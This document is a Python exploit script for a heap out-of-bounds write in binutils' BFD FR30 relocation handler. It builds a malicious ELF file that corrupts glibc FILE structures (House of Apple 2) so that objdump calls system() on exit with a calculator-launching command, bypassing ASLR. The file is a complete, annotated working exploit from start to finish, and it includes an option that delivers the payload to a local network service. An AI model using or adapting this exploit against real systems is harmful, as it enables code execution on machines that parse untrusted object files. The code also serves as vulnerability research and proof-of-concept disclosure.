#!/usr/bin/env python3
"""
ASLR RCE via House of Apple 2 + FR30 OOB heap write.

Vulnerability: fr30_elf_i32_reloc() in BFD writes 4 bytes at an attacker-
controlled offset from the .debug_info heap buffer with no bounds check:
    bfd_put_32(abfd, value, data + r_offset + 2)

Exploit chain (all 0 entropy, 100% reliable with ASLR):
  1. Partial-overwrite BFD xvec pointer → switch byte order to LE
  2. Use "partial-inplace" (PI) relocations to adjust existing heap
     pointers by constant deltas (libc→libc, heap→heap)
  3. Corrupt the BFD's iostream FILE struct:
       - vtable        → _IO_wfile_jumps  (PI libc→libc)
       - _wide_data    → fake wide_data   (PI heap→heap)
       - _lock         → fake vtable      (PI heap→heap)
       - __pad5        → system()         (PI libc→libc)
  4. Set iostream=NULL to prevent fclose, keeping FILE in _IO_list_all
  5. On exit(): _IO_flush_all → __overflow → _IO_wfile_overflow
       → _IO_wdoallocbuf → _wide_vtable.__doallocate → system(fp)

The first bytes of the FILE struct (fp+0 = _flags) contain the shell
command " (gnome-calculator&)", which system() executes.
"""
from pwn import *
import struct, os, sys

# ─── ELF constants ───────────────────────────────────────────────────
R_FR30_48 = 4  # relocation type that triggers fr30_elf_i32_reloc

def _p16(v): return struct.pack(">H", v & 0xFFFF)
def _p32(v): return struct.pack(">I", v & 0xFFFFFFFF)

def _strtab(strings):
    """Build an ELF string table. Returns (blob, {name: offset})."""
    blob = b"\x00"
    offsets = {"": 0}
    for s in strings:
        if s and s not in offsets:
            offsets[s] = len(blob)
            blob += s.encode() + b"\x00"
    return blob, offsets

# ─── Exploit constants ───────────────────────────────────────────────

# Lower 16 bits to partial-overwrite xvec pointer → LE target vector.
# The FR30 xvec and the LE xvec are both in .data.rel.ro. Only the
# bottom 16 bits differ, so a 2-byte overwrite redirects with 0 entropy
# (PIE uses 64KB alignment on aarch64, so lower 16 bits are constant).
LE_XV = 0x00b0

# Lower 16 bits of the "partial_inplace" howto in the fr30 howto table.
# This howto has partial_inplace=1, src_mask=dst_mask=0xFFFFFFFF, so
# bfd_perform_relocation will: read existing 32-bit value, add
# (symbol_value - r_offset), write result back. This is our pointer-
# arithmetic primitive — it adjusts existing pointers by a constant
# delta without knowing their absolute address.
PI_HT = 0xb820

# Constant offset from _IO_file_jumps to _IO_wfile_jumps in libc.
# Used to PI the FILE vtable to the wide-file variant (which passes
# glibc's vtable validation since both are in __libc_IO_vtables).
DW = 504

# ─── Heap layout profile ─────────────────────────────────────────────
# All offsets are relative to `data` — the .debug_info heap buffer
# address that fr30_elf_i32_reloc receives as its `data` parameter.
#
# These were calibrated empirically via GDB in a real PTY environment
# (piped execution changes heap layout due to different stdio buffering).
#
# IO : data → FILE struct (abfd->iostream)
# R  : data → internal arelent array (relocation entries on heap)
# S  : data → input_section->size field
# B  : data → BFD struct (abfd) — negative because abfd is before data
# LV : data → lock object that FILE._lock points to
# WV : data → wide_data struct that FILE._wide_data points to
# DS : libc offset: system() - stderr (= system - &_IO_list_all - 8)

PR = {
    "local": {
        "IO": 160,       # FILE struct is 160 bytes after data buffer
        "R":  47440,     # arelent array is 47440 bytes after data
        "S":  5816,      # section->size field is 5816 bytes after data
        "B":  -8400,     # BFD struct is 8400 bytes BEFORE data
        "LV": 384,       # _lock target object is 384 bytes after data
        "WV": 400,       # _wide_data struct is 400 bytes after data
        "DS": -1726592,  # system() is 1726592 bytes before stderr in libc
        # Shell command to execute. Constraints on the first 4 bytes
        # (which are also the FILE _flags field):
        #   byte[0] bit1=0 (not _IO_UNBUFFERED)  → ' ' (0x20) ✓
        #   byte[0] bit3=0 (not _IO_NO_WRITES)   → ' ' (0x20) ✓
        #   byte[1] bit3=1 (_IO_CURRENTLY_PUTTING)→ '(' (0x28) ✓
        # The & backgrounds the process so objdump exits cleanly.
        "cmd": b" (gnome-calculator&)\x00",
    },
}


def build(profile):
    """Build the exploit ELF for the given profile."""
    C = PR[profile]
    IO, R, S, B = C["IO"], C["R"], C["S"], C["B"]
    LV, WV, DS  = C["LV"], C["WV"], C["DS"]
    cmd = C["cmd"]

    # Relocation list. Each entry is either:
    #   (r_offset, value)             — normal FR30 4-byte write
    #   (r_offset, value, sym_index)  — FR30 write using specific symbol
    #   ("WB", None)                  — marker for a "wrapping write" (see below)
    #   ("PI_HT", target_idx, val)    — marker for PI howto overwrite
    rl = []

    def wb(target, value):
        """Wrapping write: write `value` at a NEGATIVE offset from data.

        The FR30 relocation uses a 32-bit r_offset from the ELF, but the
        internal arelent.address is 64-bit. We use an earlier relocation
        to write 0xFFFFFFFF into the upper 32 bits of the next arelent's
        address field. This makes the effective address wrap around in
        64-bit arithmetic:
            data + 0xFFFFFFFF_xxxxxxxx + 2
          = data + xxxxxxxx - 0x100000000 + 2
          = data + xxxxxxxx + 2 (mod 2^64, wraps backward)

        This lets us reach the BFD struct and other objects that are
        allocated BEFORE the .debug_info buffer on the heap.

        The "WB" marker is resolved later by _resolve() once we know R
        (the arelent array offset), which tells us WHERE to write the
        0xFFFFFFFF upper-32-bit value.
        """
        rl.append(("WB", None))                     # upper 32 = 0xFFFFFFFF
        rl.append(((target - 2) & 0xFFFFFFFF, value))  # actual write

    def lw(target, value):
        """Normal (local) write: write `value` at a positive offset.

        FR30 writes at (data + r_offset + 2), so we subtract 2 from the
        target to compensate. After the xvec redirect to LE, bfd_put_32
        writes in little-endian (matching the aarch64 host), so the value
        lands as expected.
        """
        rl.append((target - 2, value & 0xFFFFFFFF))

    # ─── Step 1: Redirect xvec to LE target vector ───────────────────
    # The xvec pointer at abfd+8 determines byte order for bfd_put_32.
    # We overwrite its lower 2 bytes to point to the LE target vector.
    # This is a partial overwrite with 0 entropy: PIE is 64KB-aligned
    # on aarch64, so the lower 16 bits of any PIE pointer are constant.
    #
    # The 4-byte big-endian write at abfd+6 overwrites:
    #   abfd+6..7  = last 2 bytes of filename pointer (harmless)
    #   abfd+8..9  = first 2 bytes of xvec (lower 16 bits in LE)
    #
    # We byte-swap LE_XV for the BE write so it lands correctly.
    bx = ((LE_XV & 0xFF) << 8) | ((LE_XV >> 8) & 0xFF)
    wb(B + 6, bx)

    # ─── Step 2: Set iostream = NULL ──────────────────────────────────
    # iostream is at abfd+16 (8 bytes). We zero both halves.
    # This prevents bfd_cache_close → fclose from running, which:
    #   a) Would crash on our corrupted FILE fields
    #   b) Would remove the FILE from _IO_list_all (killing the trigger)
    # With iostream=NULL, the FILE stays linked and gets flushed on exit.
    wb(B + 16, 0)
    wb(B + 20, 0)

    # ─── Step 3: Write command string to FILE._flags (fp+0) ──────────
    # system(fp) will interpret the bytes starting at fp as a command.
    # The _flags field is the first 4 bytes — they must satisfy glibc's
    # stdio flag checks (see comment in PR dict above).
    # We pad to 4-byte alignment for the LE 32-bit writes.
    cp = cmd.ljust(((len(cmd) + 3) // 4) * 4, b"\x00")
    for i in range(0, len(cp), 4):
        lw(IO + i, struct.unpack('<I', cp[i:i+4])[0])

    # ─── Step 4: Zero FILE._chain (fp+104) ────────────────────────────
    # _chain normally points to stderr. We zero it because in our fake
    # wide_data layout (fp-88), _chain falls at wd+24 = wide_write_base.
    # _IO_wfile_overflow checks: if wide_write_base != 0, skip the
    # __doallocate path entirely. Zeroing _chain makes wide_write_base=0.
    lw(IO + 104, 0)
    lw(IO + 108, 0)

    # ─── Step 5: Set write_base=1, write_ptr=2 ───────────────────────
    # _IO_flush_all_lockp (called during exit) checks:
    #   if (mode <= 0 && write_ptr > write_base) → call __overflow
    # We need write_ptr > write_base to trigger the overflow path.
    # write_base must be NON-ZERO so _IO_wfile_overflow skips the narrow
    # buffer allocation (_IO_doallocbuf) which would pre-empt the wide
    # buffer path.
    lw(IO + 32, 1);  lw(IO + 36, 0)   # _IO_write_base = 1
    lw(IO + 40, 2);  lw(IO + 44, 0)   # _IO_write_ptr  = 2

    # ─── Step 6: Inflate section->size ────────────────────────────────
    # PI relocations go through bfd_perform_relocation's default path,
    # which checks bfd_reloc_offset_in_range(). The check fails if
    # r_offset > section->size. We inflate size to 0xFFFF so PI relocs
    # at large offsets (like IO+216) pass the bounds check.
    # (Note: fr30_elf_i32_reloc does NOT check bounds — only the
    # default path used by PI relocs does.)
    lw(S, 0xFFFF)

    # ─── Step 7: Zero the lock word at fp+80 ─────────────────────────
    # fp+80 serves double duty as the start of our fake vtable AND as
    # the lock object for _IO_lock_lock (since we PI _lock to point
    # here). The lock word must be 0 (unlocked) for stdio operations
    # to proceed without deadlocking.
    lw(IO + 80, 0)

    # ─── Step 8: Zero wide_buf_base at fp-40 ─────────────────────────
    # In our fake_wide_data (at fp-88), _IO_buf_base is at wd+48 = fp-40.
    # _IO_wdoallocbuf only calls __doallocate when _IO_buf_base is NULL.
    # This address (data + IO - 40) may contain non-zero data from other
    # heap allocations, so we explicitly zero it.
    lw(IO - 40, 0)
    lw(IO - 40 + 4, 0)

    # ─── Step 9: PI (partial-inplace) relocations ─────────────────────
    # These are the core of the ASLR bypass. Each PI reloc reads an
    # existing pointer from the heap, adds a CONSTANT delta, and writes
    # it back. Since the delta is constant within a single ASLR region,
    # we can compute any libc address from any other libc address, and
    # any heap address from any other heap address — without knowing
    # the base.
    #
    # PI reloc formula:
    #   new_value = old_value + (symbol_value - r_offset)
    # We want: new_value = old_value + delta
    # So: symbol_value = delta + r_offset
    #
    # To make bfd_perform_relocation use the PI path, we overwrite the
    # lower 16 bits of each PI reloc's howto pointer (in the arelent
    # struct) to point to the partial_inplace howto at PI_HT.

    pi_relocs = [
        # (target_offset, delta)
        #
        # 1. vtable: _IO_file_jumps → _IO_wfile_jumps
        #    Both are valid vtables in __libc_IO_vtables, so this passes
        #    glibc's vtable check. _IO_wfile_jumps routes __overflow to
        #    _IO_wfile_overflow, which accesses the unchecked _wide_vtable.
        (IO + 216, DW),

        # 2. _lock: lock_object → fp+80 (fake vtable base)
        #    Serves two purposes: (a) the lock word at fp+80 is 0, so
        #    lock acquisition succeeds, and (b) the fake_wide_data's
        #    _wide_vtable (at wd+224 = fp+136 = _lock field) reads this
        #    value, making _wide_vtable = fp+80 = our fake vtable.
        (IO + 136, (IO + 80) - LV),

        # 3. _wide_data: wide_data_struct → fp-88 (fake wide_data)
        #    Redirects _wide_data to an area where we control the layout:
        #      wd+24  = fp-64 = _chain (zeroed in step 4) → write_base=0
        #      wd+48  = fp-40 (zeroed in step 8)          → buf_base=0
        #      wd+224 = fp+136 = _lock field               → _wide_vtable
        (IO + 160, (IO - 88) - WV),

        # 4. __pad5: &_IO_list_all → system()
        #    __pad5 at fp+184 naturally contains &_IO_list_all (a libc
        #    address 8 bytes before stderr). We adjust it to system().
        #    In our fake vtable, __doallocate is at fake_vtable+104 =
        #    fp+80+104 = fp+184 = this field. So __doallocate = system().
        (IO + 184, DS + 8),
    ]

    n_pi = len(pi_relocs)
    n_pre = len(rl)          # number of non-PI relocs so far
    pi_start = n_pre + n_pi  # index where PI relocs will be in the arelent array

    # For each PI reloc, we need to overwrite the howto pointer in its
    # arelent struct. We write PI_HT into the lower 16 bits of the
    # howto field (at arelent offset 22-25, overlapping sym_ptr_ptr's
    # upper bytes and howto's lower bytes). The upper bits of howto stay
    # from the original R_FR30_48 howto, so the pointer lands on the
    # partial_inplace howto at the same page.
    for i in range(n_pi):
        val = ((PI_HT & 0xFF) << 16) | (((PI_HT >> 8) & 0xFF) << 24)
        rl.append(("PI_HT", pi_start + i, val))

    # Each PI reloc uses a dedicated symbol whose value encodes the delta.
    # symbol_value = delta + r_offset (compensates for pcrel_offset=1 in
    # the PI howto, which subtracts r_offset from the relocation result).
    pi_sv = []
    for r_off, delta in pi_relocs:
        sv = (delta + r_off) & 0xFFFFFFFF
        pi_sv.append(sv)
        # sym_index = 3 + i (symbols 0=null, 1=.text, 2=.debug_info, 3..6=PI)
        rl.append((r_off, 0, 3 + len(pi_sv) - 1))

    final = _resolve(rl, R)
    return _mkelf(final, pi_sv)


def _resolve(rl, R):
    """Replace symbolic markers with concrete r_offset values.

    R is the offset from data to the arelent array on the heap. We need
    it to compute where to write the upper-32-bit values (for wrapping
    writes) and the howto pointer overwrites (for PI relocs).

    arelent struct layout on aarch64 (32 bytes):
      +0:  sym_ptr_ptr  (8 bytes, pointer to symbol)
      +8:  address      (8 bytes, r_offset in 64-bit)
      +16: addend       (8 bytes)
      +24: howto        (8 bytes, pointer to reloc_howto_type)
    """
    out = []
    for e in rl:
        if isinstance(e[0], str) and e[0] == "WB":
            # Write 0xFFFFFFFF to the upper 4 bytes of the NEXT arelent's
            # address field (at arelent[next].address + 4 = offset 12).
            next_idx = len(out) + 1
            out.append((R + next_idx * 32 + 12 - 2, 0xFFFFFFFF))
        elif isinstance(e[0], str) and e[0] == "PI_HT":
            # Write PI_HT into the lower 16 bits of a PI arelent's howto
            # pointer (at arelent[target].howto = offset 24, but we write
            # at offset 22 to hit bytes 24-25 via the 4-byte write).
            target_idx = e[1]
            out.append((R + target_idx * 32 + 22 - 2, e[2]))
        else:
            out.append(e)
    return out


def _mkelf(rl, pi_sv, dsz=144):
    """Build a minimal FR30 ELF32 big-endian relocatable.

    dsz controls the .debug_info section size. This is critical for
    heap layout: dsz=144 ensures the fake_wide_data fields (wd+24 and
    wd+48) land in memory that stays zero through the exit trigger,
    avoiding tcache metadata and locale string allocations that corrupt
    those fields with smaller sizes.

    Sections:
      0: NULL
      1: .text           (4 bytes, placeholder)
      2: .debug_info     (dsz bytes, target for relocations)
      3: .rela.debug_info (our exploit relocations)
      4: .symtab
      5: .strtab
      6: .shstrtab
    """
    di = b"\x00" * dsz     # .debug_info content (all zeros)
    tx = b"\x00" * 4       # .text content (placeholder)

    # String tables
    sec_names = [".text", ".rela.debug_info", ".symtab", ".strtab", ".shstrtab"]
    ss, so = _strtab(sec_names)  # section name string table
    st, to = _strtab(["foo"])    # symbol name string table

    # Symbol table: null + .text section + .debug_info section + PI syms + foo
    def sym(name, value, size, info, shndx):
        return _p32(name) + _p32(value) + _p32(size) + bytes([info, 0]) + _p16(shndx)

    sb  = sym(0, 0, 0, 0, 0)       # [0] null symbol
    sb += sym(0, 0, 0, 0x03, 1)    # [1] .text section symbol (STT_SECTION)
    sb += sym(0, 0, 0, 0x03, 2)    # [2] .debug_info section symbol
    for v in pi_sv:
        sb += sym(0, v, 0, 0, 1)   # [3..6] PI symbols with computed values
    sb += sym(to["foo"], 0, 4, 0x12, 1)  # [7] foo (STB_GLOBAL, STT_FUNC)
    first_global = 3 + len(pi_sv)  # symtab sh_info = first global symbol index

    # Relocation entries (ELF32 RELA: 12 bytes each)
    ra = b""
    for e in rl:
        r_offset = e[0]
        r_addend = e[1] if len(e) >= 2 else 0
        sym_idx  = e[2] if len(e) > 2 else 1  # default: .text section symbol
        r_info = (sym_idx << 8) | R_FR30_48
        ra += _p32(r_offset & 0xFFFFFFFF) + _p32(r_info) + _p32(r_addend & 0xFFFFFFFF)

    # File layout: ELF header (52) + sections + section headers
    o = 52
    text_off = o;    o += len(tx)
    di_off   = o;    o += len(di)
    rela_off = o;    o += len(ra)
    sym_off  = o;    o += len(sb)
    str_off  = o;    o += len(st)
    shstr_off = o;   o += len(ss)
    shdr_off = o

    # Section header builder
    def shdr(name, stype, flags, offset, size, link, info, align, entsize):
        return (_p32(name) + _p32(stype) + _p32(flags) + _p32(0) +
                _p32(offset) + _p32(size) + _p32(link) + _p32(info) +
                _p32(align) + _p32(entsize))

    hdrs  = shdr(0, 0, 0, 0, 0, 0, 0, 0, 0)                                    # [0] NULL
    hdrs += shdr(so[".text"], 1, 6, text_off, len(tx), 0, 0, 4, 0)              # [1] .text
    hdrs += shdr(so[".rela.debug_info"]+5, 1, 0, di_off, len(di), 0, 0, 1, 0)   # [2] .debug_info
    hdrs += shdr(so[".rela.debug_info"], 4, 0x40, rela_off, len(ra), 4, 2, 4, 12) # [3] .rela.debug_info
    hdrs += shdr(so[".symtab"], 2, 0, sym_off, len(sb), 5, first_global, 4, 16) # [4] .symtab
    hdrs += shdr(so[".strtab"], 3, 0, str_off, len(st), 0, 0, 1, 0)             # [5] .strtab
    hdrs += shdr(so[".shstrtab"], 3, 0, shstr_off, len(ss), 0, 0, 1, 0)         # [6] .shstrtab

    # ELF header (52 bytes, ELF32 big-endian FR30)
    ident = b"\x7fELF" + bytes([1, 2, 1, 0]) + b"\x00" * 8  # ELF32, big-endian, ELFOSABI_NONE
    ehdr = (ident +
            _p16(1) +          # e_type = ET_REL (relocatable)
            _p16(0x54) +       # e_machine = EM_FR30
            _p32(1) +          # e_version = EV_CURRENT
            _p32(0) +          # e_entry
            _p32(0) +          # e_phoff (no program headers)
            _p32(shdr_off) +   # e_shoff
            _p32(0) +          # e_flags
            _p16(52) +         # e_ehsize
            _p16(0) +          # e_phentsize
            _p16(0) +          # e_phnum
            _p16(40) +         # e_shentsize
            _p16(7) +          # e_shnum (7 sections including NULL)
            _p16(6))           # e_shstrndx (index of .shstrtab)

    return ehdr + tx + di + ra + sb + st + ss + hdrs


def main():
    here = os.path.dirname(os.path.abspath(__file__))
    profile = sys.argv[1] if len(sys.argv) > 1 else "local"
    assert profile in PR, f"Unknown profile: {profile}. Available: {list(PR.keys())}"

    context.binary = ELF("./binutils-gdb/binutils/objdump", checksec=False)
    log.info(f"Building '{profile}' RCE exploit")

    elf = build(profile)
    out = os.path.join(here, "poc_rce.bin")
    with open(out, "wb") as f:
        f.write(elf)
    log.info(f"Wrote {len(elf)} bytes, cmd={PR[profile]['cmd']}")

    if profile == "server":
        r = remote("localhost", 31337)
        r.recvuntil(b"stdin\n")
        r.send(elf)
        r.shutdown("send")
        try:
            print(r.recvall(timeout=12).decode(errors="replace"))
        except:
            log.info("Timeout")
        r.close()
    else:
        objdump = os.path.join(here, "binutils-gdb/binutils/objdump")
        log.info(f"Running: {objdump} -g {out}")
        os.execvp(objdump, [objdump, "-g", out])


if __name__ == "__main__":
    main()
